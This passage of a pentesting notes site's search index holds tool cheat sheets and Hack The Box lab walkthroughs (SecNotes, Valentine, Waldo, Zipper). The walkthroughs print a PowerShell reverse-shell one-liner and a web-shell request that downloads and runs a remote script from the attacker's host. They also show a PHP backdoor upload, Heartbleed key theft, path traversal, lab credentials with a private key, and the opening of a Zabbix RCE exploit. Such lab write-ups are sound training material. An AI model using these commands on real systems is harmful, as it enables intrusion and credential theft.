--use-ccache Use the winbind ccache for authentication --pw-nt-hash The supplied password is the NT hash  SMBMAP\nSMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com optional arguments: -h, --Help show this help message and exit Main arguments: -H HOST IP of host --host-file FILE File containing a list of hosts -u USERNAME Username, if omitted null session assumed -p PASSWORD Password or NTLM hash -s SHARE Specify a share (default C$), ex 'C$' -d DOMAIN Domain name (default WORKGROUP) -P PORT SMB port (default 445) Command Execution: Options for executing commands on the specified host -x COMMAND Execute a command ex. 'ipconfig /r' Filesystem Search: Options for searching/enumerating the filesystem of the specified host -L List all drives on the specified host @@@@-R [PATH] Recursively list dirs, and files (no share\\path lists ALL shares), ex. 'C$\\Finance' -r [PATH] List contents of directory, default is to list root of all shares, ex. -r 'C$\\Documents and Settings\\Administrator\\Documents' -A PATTERN Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex '(web|global).(asax|config)' -q Disable verbose output (basically only really useful with -A) File Content Search: Options for searching the content of files -F PATTERN File content search, -F '[Pp]assword' (requies admin access to execute commands, and powershell on victim host) --search-path PATH Specify drive/path to search (used with -F, default C:\\Users), ex 'D:\\HR\\' Filesystem interaction: Options for interacting with the specified host's filesystem --download PATH Download a file from the remote system, ex.'C$\\temp\\passwords.txt' --upload SRC DST Upload a file to the remote system ex. '/tmp/payload.exe C$\\temp\\payload.exe' --delete PATH TO FILE Delete a remote file, ex. 'C$\\temp\\msf.exe' --skip Skip delete file confirmation prompt Examples: $ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1 $ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20 $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group \u0026quot;Domain Admins\u0026quot; /domain'  NMAP\nhttps://nmap.org/nsedoc/scripts/smb-enum-shares.html\nnmap tools 137-139\nsudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 IP_ADDR  nmap 445\nnmap --script smb-enum-shares.nse -p445 IP_ADDR  "
},
{
	"uri": "/tools/snmpwalk/",
	"title": "SNMPWalk",
	"tags": [],
	"description": "",
	"content": "snmp has three version 1, 2c \u0026amp; 3 typically for htb so far its been public but that may not always be the cause. Snmp stands for simple network managment protocal. this allows administrators to collect information for logs. SNMP3 adds a layer of security by providing authentication. In mischief I abused snmp 2c to gain system creds.\nsnmpwalk -c public -v2c 10.10.10.92 | tee snmpwalk-mib.out tee prints out the output as it reads it. -c group -version 1,2c,3 ipAddressTable = prints out ip address table hrSWRunTable = running processes snmpwalk -c public -v2c 10.10.10.92 hrSWRunTable  OID REFERENCE\nAnother Cool tool to easily convert ipv6 strings returned by snmpwalk into something readable is Enxy.\nIf snmp-mibs-downloader is enabled it will produce an error because the python script is looking for the normal output. So need uncomment it out for it to work.\n https://github.com/trickster0/Enyx\npython enyx.py 2x public 10.10.10.92  Install snmp-mibs-downloader to make oid more readable it will also convert ipv6 decimal into hex making it more manageable.\n apt install snmp-mibs-downloader\nvi /etc/snmp/snmp.conf  comment out mibs\n"
},
{
	"uri": "/tools/ssh/sshtunnling/",
	"title": "SSHuttle",
	"tags": [],
	"description": "",
	"content": " Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target\u0026rsquo;s network. It has a lot of options/switches to use but by default, they are set to auto/detect. So typically you won\u0026rsquo;t need most of them.\nDOWNLOAD  Something to note you will need root access to run sshuttle; be sure to test the connection before wildly connecting.\nConnecting to a router with enabled ssh will give you access to the whole network. That is typical of VPN anyways.\nsshuttle -r chicken@192.168.1.6 172.16.42.0/24\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;-r --remote\u0026lt;/code\u0026gt;   "
},
{
	"uri": "/hackthebox/boxes/secnotes/",
	"title": "SecNotes",
	"tags": [],
	"description": "",
	"content": " NMAP PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods:\n|_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Secure Notes - Login\n|Requested resource was login.php 445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 8808/tcp open http Microsoft IIS httpd 10.0 |-methods: | Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows\nService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results: |_clock-skew: mean: 2h32m44s, deviation: 4h37m10s, median: -7m17s\n| smb-os-discovery: | OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)\n| OS CPE: cpe:/o:microsoft:windows10::-\n| Computer name: SECNOTES | NetBIOS computer name: SECNOTES\\x00 | Workgroup: HTB\\x00 | System time: 2019-01-02T17:39:25-08:00\n| smb-security-mode: | account_used: guest | authentication_level: user | challengeresponse: supported | messagesigning: disabled (dangerous, but default)\n| smb2-security-mode: | 2.02: | Message signing enabled but not required\n| smb2-time: | date: 2019-01-02 20:39:21 |_ start_date: N/A\ncreate a user contact the admin well uses the change_pass to change tylers password\ngo to contact then send tyler a request to change his password to whatever\nCSFA\nhttp://10.10.10.97/change_pass.php?password=chickenpwny\u0026amp;confirm_password=chickenpwny\u0026amp;submit=submit\nFOUND CREDS\ntyler 92g!mA8BGjOirkL%OG*\u0026amp;\nsmbmap -H 10.10.10.97 -u tyler -p \u0026lsquo;92g!mA8BGjOirkL%OG*\u0026amp;\u0026rsquo; [+] Finding open SMB ports\u0026hellip;. [+] User SMB session establishd on 10.10.10.97\u0026hellip; [+] IP: 10.10.10.97:445 Name: 10.10.10.97\n​ Disk Permissions\n​ ADMIN$ NO ACCESS ​ C$ NO ACCESS ​ IPC$ READ ONLY ​ new-site READ, WRITE\nSMBMAP\n -r--r--r-- 696 Thu Jun 21 16:15:36 2018 iisstart.htm -r--r--r-- 98757 Thu Jun 21 16:15:38 2018 iisstart.png  smbmap -H 10.10.10.97 -R new-site -u tyler -p \u0026lsquo;92g!mA8BGjOirkL%OG*\u0026amp;\u0026rsquo; \u0026ndash;upload php-backdoor.php\n\u0026ndash;download PATH Download a file from the remote system,\n\u0026ndash;upload SRC DST Upload a file to the remote system ex. ​ \u0026lsquo;/tmp/payload.exe C$\\temp\\payload.exe\u0026rsquo;\n\u0026ndash;delete PATH TO FILE\n​ Delete a remote file, ex. \u0026lsquo;C$\\temp\\msf.exe\u0026rsquo;\nsmbclient -U tyler \\\\10.10.10.97\\new-site\nsick of smb asking for creds annoying , smbclient has an auth-file switch -A. Next upload the simple-php-backdoor i named mine iisstart.php there are some filters going on if the file isn\u0026rsquo;t named iisstart it will be removed shortly.\nsmbclient -A smb_key \\\\\\\\10.10.10.97\\\\new-site\nput iisstart.php\nnow to test if it works with a simple whoami\n$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;LHOST\u0026#39;,LPORT); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String ); $sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); Nothing quite like when burp hangs.\nGET /iisstart.php?cmd=powershell+IEX(New-Object+Net.WebClient).downloadString(\u0026lsquo;http://10.10.14.16/Invoke-PowerShellTcp.ps1') HTTP/1.1\nHost: 10.10.10.97:8808\ntry newsstat\nnetstat -ant\ndidn\u0026rsquo;t return anything\ncmd /r dir /a\ncmd ubuntu.exe\nhttps://docs.microsoft.com/en-us/windows/wsl/install-on-server\nWindows Subsystem for Linux 07/11/2017 05:10 PM 190,434 AppxBlockMap.xml\n07/11/2017 05:10 PM 2,475 AppxManifest.xml\n06/21/2018 02:07 PM  AppxMetadata\n07/11/2017 05:11 PM 10,554 AppxSignature.p7x\n06/21/2018 02:07 PM  Assets\n06/21/2018 02:07 PM  images\n07/11/2017 05:10 PM 201,254,783 install.tar.gz\n07/11/2017 05:10 PM 4,840 resources.pri\n06/21/2018 04:51 PM  temp\n07/11/2017 05:10 PM 222,208 ubuntu.exe\n07/11/2017 05:10 PM 809 [Content_Types].xml\nso using wsl.exe we can use wget the system has cat\nin linuc bash files are stored in root or the users home directory.\ndoskey /History to view command prompt entries\nC:\\Users\\charl\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs\\root\nafter installing wsl on my computer and doing some test to see how wsl worked. it stores data in appdata\nfound where wsl stores information used\nC:\\users\\tyler\\appdata\\Local\\packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\localstate\\rootfs\\root\ncmd /r type .bash_history\n \u0026gt; /r type .bash_history \u0026gt; cd /mnt/c/ \u0026gt; ls \u0026gt; cd Users/ \u0026gt; cd / \u0026gt; cd ~ \u0026gt; ls \u0026gt; pwd \u0026gt; mkdir filesystem \u0026gt; mount //127.0.0.1/c$ filesystem/ \u0026gt; sudo apt install cifs-utils \u0026gt; mount //127.0.0.1/c$ filesystem/ \u0026gt; mount //127.0.0.1/c$ filesystem/ -o user=administrator \u0026gt; cat /proc/filesystems \u0026gt; sudo modprobe cifs \u0026gt; smbclient \u0026gt; apt install smbclient \u0026gt; smbclient \u0026gt; smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\\\\\127.0.0.1\\\\c$ \u0026gt; \u0026gt; \u0026gt; .bash_history \u0026gt; \u0026gt; less .bash_history \u0026gt; ``` \u0026gt; \u0026gt;  cmd /r \u0026ldquo;smbclient -U \u0026lsquo;administrator%u6!4ZwgwOM#^OBf#Nwnh\u0026rsquo; \\\\127.0.0.1\\c$\u0026rdquo;\n cmd /r \u0026ldquo;type c:\\users\\administrator\\root.txt\u0026rdquo;\n  smbclient -U \u0026lsquo;administrator%u6!4ZwgwOM#^OBf#Nwnh\u0026rsquo; \\\\127.0.0.1\\c$ ```\nCouldn\u0026rsquo;t run the command inside the box but the last entry in bash_history interested me the most. logged out and copy pasted the above string. you can get root.txt\n"
},
{
	"uri": "/tools/webapp/skipfish/",
	"title": "SkipFish",
	"tags": [],
	"description": "",
	"content": "SkipFish is a web app directory scanner that creates a neat report. it will recursively scan a web app and will look for ill regularities.\nskipfish -h [39/484] skipfish web application scanner - version 2.10b Usage: skipfish [ options ... ] -W wordlist -o output_dir start_url [ start_url2 ... ] Authentication and access options: -A user:pass - use specified HTTP authentication credentials -F host=IP - pretend that 'host' resolves to 'IP' -C name=val - append a custom cookie to all requests -H name=val - append a custom HTTP header to all requests -b (i|f|p) - use headers consistent with MSIE / Firefox / iPhone -N - do not accept any new cookies --auth-form url - form authentication URL --auth-user user - form authentication user --auth-pass pass - form authentication password --auth-verify-url - URL for in-session detection Crawl scope options: -d max_depth - maximum crawl tree depth (16) -c max_child - maximum children to index per node (512) -x max_desc - maximum descendants to index per branch (8192) -r r_limit - max total number of requests to send (100000000) -p crawl% - node and link crawl probability (100%) -q hex - repeat probabilistic scan with given seed -I string - only follow URLs matching 'string' -X string - exclude URLs matching 'string' -K string - do not fuzz parameters named 'string' -D domain - crawl cross-site links to another domain -B domain - trust, but do not crawl, another domain -Z - do not descend into 5xx locations -O - do not submit any forms -P - do not parse HTML, etc, to find new links Reporting options: -o dir - write output to specified directory (required) -M - log warnings about mixed content / non-SSL passwords -E - log all HTTP/1.0 / HTTP/1.1 caching intent mismatches -U - log all external URLs and e-mails seen -Q - completely suppress duplicate nodes in reports -u - be quiet, disable realtime progress stats -v - enable runtime logging (to stderr) Dictionary management options: -W wordlist - use a specified read-write wordlist (required) -S wordlist - load a supplemental read-only wordlist -L - do not auto-learn new keywords for the site -Y - do not fuzz extensions in directory brute-force -R age - purge words hit more than 'age' scans ago -T name=val - add new form auto-fill rule -G max_guess - maximum number of keyword guesses to keep (256) -z sigfile - load signatures from this file Performance settings: -g max_conn - max simultaneous TCP connections, global (40) -m host_conn - max simultaneous connections, per target IP (10) -f max_fail - max number of consecutive HTTP errors (100) -t req_tmout - total request response timeout (20 s) -w rw_tmout - individual network I/O timeout (10 s) -i idle_tmout - timeout on idle HTTP connections (10 s) -s s_limit - response size limit (400000 B) -e - do not keep binary responses for reporting Other settings: -l max_req - max requests per second (0.000000) -k duration - stop scanning after the given duration h:m:s --config file - load the specified configuration file Send comments and complaints to \u0026lt;heinenn@google.com\u0026gt;.  https://tools.kali.org/web-applications/skipfish\n"
},
{
	"uri": "/tools/webapp/sqlmap/sqlmap/",
	"title": "SqlMap",
	"tags": [],
	"description": "",
	"content": "SqlMap automates finding sql-injection it can use GET or POST request. It\u0026rsquo;s pretty neat.\nIn burp right click select copy to file, this will test for sql injection. pretty cool wasn\u0026rsquo;t aware it would test all the parameters. sqlmap \u0026ndash;batch -r login.req\nsqlmap --batch -u \u0026quot;http://os.htb/users/admin*\u0026quot; --level 5 --risk 3 -u url also for get request --batch run default yes --* = the parameter to fuzz --dump , --dump-all dumping sqldb to a localfile in /  "
},
{
	"uri": "/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/",
	"title": "Tools",
	"tags": [],
	"description": "",
	"content": "Tools\n"
},
{
	"uri": "/hackthebox/boxes/valentine/",
	"title": "Valentine",
	"tags": [],
	"description": "",
	"content": "I lost my original notes. VM corrupted.\nPHASE 1 — NMAP\nnmap -sC -sV -Pn -oA initial 10.10.10.79  Didn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out.\nPHASE 2 — GOBUSTER /wpscan\ngobuster -u [http://10.10.10.](http://10.10.10.88)79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50  return vulnerable to OpenSSL hearbleed\nPHASE 3 Manual investigation of the webpage\nThe big give away. A heart bleeding, hmm.\nBELIEVE THE HYPE. It’s also a hint to the exploit.\nPHASE 4\nWpscan returned Heartbleed vulnerability.\nYou may also run the exploit through Metasploit.\nmsfconsole\nsearch bleed use auxiliary/scanner/ssl/openssl_heartbleed set RHOSTS 10.10.10.79 set ACTION KEYS exploit  -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAwygXrPgZKkHSij/OeRwZ9PtI+tMvM2tvyJz5o78ZZqihjfki Yg7hnkVQH1kvrLqVz68jqlTJZEAPJajF3cvEHIcM0nMSLnd2z4lI+zlK4fU9QMO1 moJo9o2Msk0/TwMJwLqtdF1TZLBXakQPH7f2+wWIrrLByt6m+8Vmd0YpdWDQr5Hd WTA6C4+FIeVdyCIcVup6Lw0nXOKn1i5VRheHItUbZmIlhfoJHDhtGxSeqXrgMU1D Js6wkebQm0jYz095+a8SRNRl5P93R1aFTTvprdtN6y0pl/hampnDrRcabHOkBB/l 1Y6ox6YgrorgULjxstJI3n2ziQ226G3Ho4JelwIDAQABAoIBAQCWkqd5wE6CSRjt q/9deC4a04riY/CmJr2vtlXyXi52A6Pqi49YwwyW9fm0xjY/ehK+k+3brOFZ5QcK 0mYgE+iy7gwZj8k2atwTkmPp2bGKF5J0FsxWc0oS+PHWXD19c+Wheyb7gkomhNxd VDerDGCWGxXzXF6jbRi/ZvYBDvRL59YOvXmdQa3MKykGywUn+NFZvUxICyEma24K 5ABMIWm5cTmDzm5Cd5/wn5Pu4tY0TIzfoa3KnA+M8vpmd4xgRGWGpatFKrM3LqSq W0+Rr81Ty/R7lr1DkLDKp1ltvCl3pp1Lkoo3Ublk38C6gHHS3Vfs6h+QJfNgjeQu RyKqm3H5AoGBAPFMTE9WpalFjB0u+hHNbFRfRet8480wa5702AEDK/cHi0U+R9Z0 Va/qm7PtzBP/m4nUXJwZbvG9O2PKXusGmgIBc/jqSQpQriIvBb27AJiq65Jd7tJ4 AiNZm6v/bFChFmWhdZe1S4vBgnlYoRWHsu+3JJpMJFKZYYl9O/X8ZWdtAoGBAM8M F8KO2EtVQUrosnZQfn+2pLbY4n4Q66N3QaBeoqY7UipBJ1r3jIfupiw5+M1gEXvB gnQmRLwRAA7Wmsh0/eCxeOk7kgNr7W8nNdxwp0Uv06h1CtEqvFIuXab5pYG5/QKs habSXxY02QuaVgM/vXBTSOO0TC/7Rm6ORJzAxAeTAoGBAOakinBvnwuMmaAvjgJE O57uLlQoXUp9VPFskaduE7EdOecm393B90GeW9QBoccf1NlK7naa7OwOd90ry8yU 09LE9shfkQ9WDQxJrBAt1iUXgvK17Jiq80g818rw6+SqBVGBongvZ5WfkwpQSDDf M49knI0L6NA3If8cgJrg9UCFAoGBAK1DJmL23MP13UTNhAKEi8deVWp6BteOW1KZ Cr8kUqIfRDv99+wk+mIKcN7TyIQ9H4RbxEpkd+KVq2G/bxnO5WFxwogTBLZ+S9xX iLgnQaMhSdNP1rSBOcTf7hk8EqeDt9nT+6hFpbLUmMkf51iir2nfGEEM8TC56w+7 WGmA2sqnAoGAUyztn0Sc08xny1oGQXjVcVy/KsszYNfaF2y4i6tsbDsD2HfzRvbp zeSeXxopyjjMTKCIMONh88JFeJoctmsLg2eG3uFw5c+wvD+GBafFfufvf2Xz183h 05q+RVlBncSiUayk33RtWi0Csl9L3prrGKh9RLUBmkSZ/E90ATxE92w= -----END RSA PRIVATE KEY-----  Buahahahahaha, we have the ssh RSA key. Truly we are master of the universe.\nwithout Metasploit; some crap the server leaked.\nPHASE 6 SSH\nSince we have the private keys and the ssh server has the public key all we need is the username. Based on the webpage hints my guess was it was\nhype\n create a file named private-key \u0026amp; change the permissions to 600.\nvi private-key in vim tpye :set paste then paste crlt-v chmod 600 private-key ssh -i private-key hype@valentine.htb  Snap we will need the passphrase for for the private key.\ngo back to msfconsole and change the action to dump. Note you might need to repeat this a couple of times to find base64 encoded string.\nset action DUMP  Metasploit stores the data in .msf4/loot/somefile\necho \u0026quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\u0026quot; \u0026gt; string.b64 base64 -d strting.b64 heartbleedbelievethehype  ssh -i private-key hype@10.10.10.79\npassphrase = heartbleedbelievethehype\nHmm the key I found with metasploit doens\u0026rsquo;t work but there is a private-key, I found earlier. repeat the steps from earlier and use the passphrase from the Metasploit memory dump .\n We’re inside lets transfer over LinEnum. LinEnum is a script that automates enumerating the system. Python server is a neat way to move files around between systems.\nhttps://github.com/rebootuser/LinEnum.git\nHOSTING FILES go to directory where desired file is run command below, it will host the directory python3 -m http.server 8081 go to browser http://localhost:[port]/[DirectoryName] note: i had to clear the firefox cache wget http://10.10.14.7:4488/home/  haha that’s it folks\nA few lessons can be learned from this box beside updating the web server. Make sure system tools are properly secured. Make sure no level users can access bash-history. Be careful using setuid.\nTmux isn’t always vulnerable but it can be when we can link it to a file/folder with the need permissions. Tmux has the ability to link its self to a file or folders group permissions. Ill talk about file permissions later. what a suid binary is.\nnote : watch ippsec video on the box\nA better way to scan for vulns:\nnmap -sV -p 445 — script safe -Pn -n -oA NmapScripts 10.10.10.97  "
},
{
	"uri": "/tools/webapp/wfuzz/",
	"title": "WFuzz",
	"tags": [],
	"description": "",
	"content": " WFUZZ WFUZZ is a powerful fuzzer, you can enumerate directories, Wierd directories. You can also use it for bruteforcing passwords, look for Lfi, I could keep going. This is a swiss army knife it doesn\u0026rsquo;t beat manual enumeration. Becoming dependent on this tool to look for SQL injection can lead you to miss something obvious.\nwfuzz -c -w -d \u0026quot;password=FUZZ\u0026quot; -u \u0026quot;http://IP_ADDRESS\u0026quot; --hh 474 -t 42 -c Output text with colors nice feature. -w wordlist -d Post-Data request -u url --hh hide response chars length -t threads #################################### wfuzz -c -b 'PHPSESSID=RepLAceME' -w '/the dictionary' -d 'http://Subscribe/to/ippsec.php?FUZZ=/etc/passwd' -d post-data --hh hide responses with a n(1,2,4,22) character length -b Cookie or the php session id -w Dictionary WordList what have you https://github.com/danielmiessler/SecLists by defaul the last part is always the url or target you can uses the -u url -H header FUZZ.hackthebox.htb used to enumerate subdomains /Seclist/Discovery/DNS/subdomains-top1mil-5000.txt ####################### SUBDOMAIN FUZZING wfuzz -c -f sub-fighter -w /wordlist/seclist/Deiscovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://chaos.htb\u0026quot; -H \u0026quot;Host: FUZZ.chaos.htb\u0026quot; -t 42 --hl 1 -H this is important for fuzzing the sub-domain -f save output to file. ######################## wfuzz -c -b 'PHPSESSID=RepLAceME' -w '/the dictionary' -u 'http://Subscribe/to/ippsec.php?action=FUZZ' this method different than the above. this uses get request or a stanard request. -d is for post.for this one action is replaceable with any php action info file action. -c add colour -b session id you mgiht need it -w word dictionary -u url  Post-Request this one slightly different than above post request one this uses ipv6 from the mischief box. second the formatting is slightly different.\nwfuzz -c -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -d \u0026ldquo;FUZZ=junk\u0026rdquo; \u0026ndash;hh 403 \u0026lsquo;http://loki.htb/'\n"
},
{
	"uri": "/hackthebox/boxes/waldo/",
	"title": "Waldo",
	"tags": [],
	"description": "",
	"content": "WALDO\nInstead of giving binaries system-wide permissions, give them the permissions they need to do the job.\nSkipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work.\nSqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output. Nothing I tried allowed me to escape the current directory. Examining what’s available the PHP source code that’s running the website. The PHP script appears to call a bunch of functions from the PHP library =D. REQUEST_METHOD determines whether the request was a post or a get === strict comparison to POST request. the first few parts of the stript involve telling the browser what kind of data to expect Content-Type. “str_replace — Replace all occurrences of the search string with the replacement string” str_replace takes every occurrence of the the subject and replaces those values with replace. Mixed str_replace ( mixed $search , mixed\nIt finds ../ or ..\\” it will replace them with nothing the two quotes in replace represent nothing. the next part say if file name === (strict) user.txt print false(no user.txt) . /n/t/t, /n newline /tab /tab json_encode($filecontent) is taking the var file content and encoding the output(that will matter later) taking all this into consideration the script only checks for ../ or ..\\ anything else it find’s, it’ll ignore. I tried encoding these in every possible way. Then I was reading about LFI and saw it ….// yes the holy grail. ….//….//….// escaped out and allowed for directory traversal.\nI didn’t see .ssh at first because I’ve seen it before. when trying to view .ssh with fileRead it spat out is a directory noticed the output with request differs from .ash_history. bash_history produces false .ssh produced a file. Plug that into fileRead. Then you should find ssh private key!!! the format all fudged. using vim repeat I was able to clean up the file. when editing the file \\n is not a null character, it means newline in JSON. need to also get rid of “\\” this part was also tricky because of these two ports 9000 8888 rabbit holes. Netstat -antp after looking at it for a while noticed some of the ssh connection came from local address rcf-1904 address from localhost weird. That was the next big hint. Since the .monitor file is local now it’ll make it easier to use. the next username is monitor. Next were cast into a restricted environment (jail) to get out of this use the -t switch in ssh -t (bash — noprofile). Lots of rabbit holes \u0026amp; some useless tools.\nssh monitor@waldo -i .monitor -t \u0026quot;bash --noprofile\u0026quot;  PERMISSIONS\n-rwSr--r-- 1 root root first s is the suid bit the capital S denotes the file isn't executable. -rwsr-sr-x 1 root root first s is the suid bit second is the guid bit sticky bit the file gets its permissions from the parent directory  The for mentioned permissions are system-wide can have unintended effects that can often lead to getting root access in one way or another. If the binaries only need to read files with root permissions. Theirs this thing called capabilities. where the file is given limited permission as root. There is a whole a lot of different ones to choose from the one we’re interested in is.\n/usr/bin/tac = cap_dac_read_search  Allows the binary to read files as root. It took a while to find the tools full path getcap basically the find command for Linux capabilities.\n/sbin/getcap -r / 2\u0026gt;/dev/null. If you don’t run it with dev/null it’ll kind of lead you to the .monitor script but we want tac. tac just cat but in reverse lol. cat /root/root.txt  Conclusion\nInstead of giving binaries system-wide permissions, give them the permissions they need to do the job.\n"
},
{
	"uri": "/concepts/webapppentest/",
	"title": "WebAppPenTests",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/webapp/",
	"title": "WebApps",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hackthebox/boxes/zipper/",
	"title": "Zipper",
	"tags": [],
	"description": "",
	"content": " NMAP\ninitial\n# Nmap 7.70 scan initiated Fri Feb 15 14:32:38 2019 as: nmap -sC -sV -oA nmap/intial -T4 10.10.10.108 Nmap scan report for 10.10.10.108 Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA) | 256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA) |_ 256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 15 14:32:49 2019 -- 1 IP address (1 host up) scanned in 10.44 seconds  TOTAL\nnmap -T3 -Pn -p- -oA total 10.10.10.108 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 14:43 EST Nmap scan report for 10.10.10.108 Host is up (0.048s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10050/tcp open zabbix-agent  UDP\nGOBUSTER \u0026ndash;10.10.10.108\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.108  /zabbix (Status: 301)  /images (Status: 301) /img (Status: 301) /audio (Status: 301) /local (Status: 403) /app (Status: 403) /js (Status: 301) /include (Status: 403) /conf (Status: 403) /styles (Status: 301) /fonts (Status: 301) /locale (Status: 301)  had some errors enuemrating local sinces its 403 force wildcards and then had to remove 404\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.108/zabbix/local -fw -s \u0026quot;200,204,301,302,307\u0026quot;  SEARCHSPLOIT /usr/share/exploitdb/\nZabbix - (Authenticated) Remote Command Execution (Metasploit) | exploits/linux/remote/29321.rb Zabbix 2.0 \u0026lt; 3.0.3 - SQL Injection | exploits/php/webapps/40353.py Zabbix 2.0.1 - Session Extractor X | exploits/php/webapps/20087.py Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Me | exploits/php/webapps/36157.rb Zabbix 2.0.8 - SQL Injection / Remote Code Execution (Metasploit) | xploits/unix/webapps/28972.rb Zabbix 2.2 \u0026lt; 3.0.3 - API JSON-RPC Remote Code Execution X | exploits/php/webapps/39937.py Zabbix 2.2.x/3.0.x - SQL Injection | xploits/php/webapps/40237.txt Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) | exploits/freebsd/remote/16918.rb Zabbix Agent 3.0.1 - 'mysql.size' Shell Command Injection | exploits/linux/local/39769.txt Zabbix Agent \u0026lt; 1.6.7 - Remote Bypass | exploits/multiple/webapps/10431.txt Zabbix Server - Arbitrary Command Execution (Metasploit) | exploits/linux/remote/20796.rb Zabbix Server - Multiple Vulnerabilities | exploits/multiple/webapps/10432.txt  WEBAPP\nSo apartently getting a users credentials isn\u0026rsquo;t nessisary to get what i need but i dont have creds but i have access to guest account which will give me access to whatever is need to get rce.\nhttp://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.106180\nSQL INHJECTION\ntesting parameters\ntried testing latest,oho oaram toggle_ids for sql injection nothing returned, but burp did hang which is very very odd.\nsearchsploit python binary 39937.py returns none. i had errors playing around with the sql part in burp. I believe this is protected. since guest login is enabled removing the login parts was nessisary as the login part isn\u0026rsquo;t nessisary.\nimport requests import json import readline  BURPHYDRA\nHydra seems a little tricky tried some short password list to no avail but might have been using the wrong post request parameters.\nhydra 10.10.10.108 -L /home/htb/wordlist/seclist/Usernames/top-usernames-shortlist.txt -P /home/htb/wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http-form-post \u0026quot;/zabbix/index.php:name=^USER^\u0026amp;password=^PASS^\u0026amp;autologin=1\u0026amp;enter=Sign+in:Login name or password is incorrect.\u0026quot;  Sucess\nhydra 10.10.10.108 -L users -P /home/htb /wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http- form-post \u0026quot;/zabbix/index.php:name=^USER^\u0026amp;password=^PASS^\u0026amp;autologin=1\u0026amp;enter=Sign+in:Login na me or password is incorrect.\u0026quot; -I  Reviewing 33937.py\nhttps://www.exploit-db.com/exploits/39937\npretty straight forward but some parts of it are broken or didn\u0026rsquo;t work because the code return none but thats put in and i dont know what to change it to. Moving forward just have to remove those elements form the binary and add print cmd_exec/\nDO NOT COPY PASTA EDIT YOUR SELF.\n#!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://192.168.66.2'\t### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php'\t### Don't edit login = 'Admin'\t### Zabbix login password = 'zabbix'\t### Zabbix password hostid = '10084'\t### Zabbix hostid ### auth payload = { \u0026quot;jsonrpc\u0026quot; : \u0026quot;2.0\u0026quot;, 